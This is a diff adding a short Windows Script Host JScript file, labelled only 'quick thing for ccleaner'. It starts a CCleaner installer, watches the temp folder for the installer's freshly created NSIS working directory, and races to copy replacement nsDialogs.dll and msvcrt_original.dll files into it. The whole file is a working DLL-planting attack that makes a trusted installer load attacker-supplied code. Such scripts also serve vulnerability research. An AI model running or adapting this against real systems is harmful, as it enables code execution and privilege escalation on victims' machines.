@@ -1,0 +1,40 @@
+<?xml version="1.0"?>
+<job>
+<script language="JScript">
+<![CDATA[
+// quick thing for ccleaner
+var sh = new ActiveXObject("WScript.Shell");
+var fs = new ActiveXObject("Scripting.FileSystemObject");
+
+var tmp = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%\\Temp");
+var exe = "ccsetup564.exe";
+
+sh.Run('"' + exe + '"',1,false);
+WScript.Sleep(2000);
+
+while(true){
+ WScript.Sleep(500);
+ var now = new Date();
+ var fld = fs.GetFolder(tmp);
+ var subs = new Enumerator(fld.SubFolders);
+
+ for(;!subs.atEnd();subs.moveNext()){
+  var sub = subs.item();
+  var n = sub.Name.toLowerCase();
+
+  if(n.indexOf("ns")==0 && n.indexOf(".tmp")>0){
+   var cr = new Date(sub.DateCreated);
+   if((now-cr)/1000<=60){
+    fs.CopyFile("nsDialogs.dll", sub.Path+"\\nsDialogs.dll", true);
+    fs.CopyFile("msvcrt_original.dll", sub.Path+"\\msvcrt_original.dll", true);
+    WScript.Sleep(3000);
+    fs.CopyFile("nsDialogs.dll", sub.Path+"\\nsDialogs.dll", true);
+    fs.CopyFile("msvcrt_original.dll", sub.Path+"\\msvcrt_original.dll", true);
+    WScript.Quit(0);
+   }
+  }
+ }
+}
+]]>
+</script>
+</job>
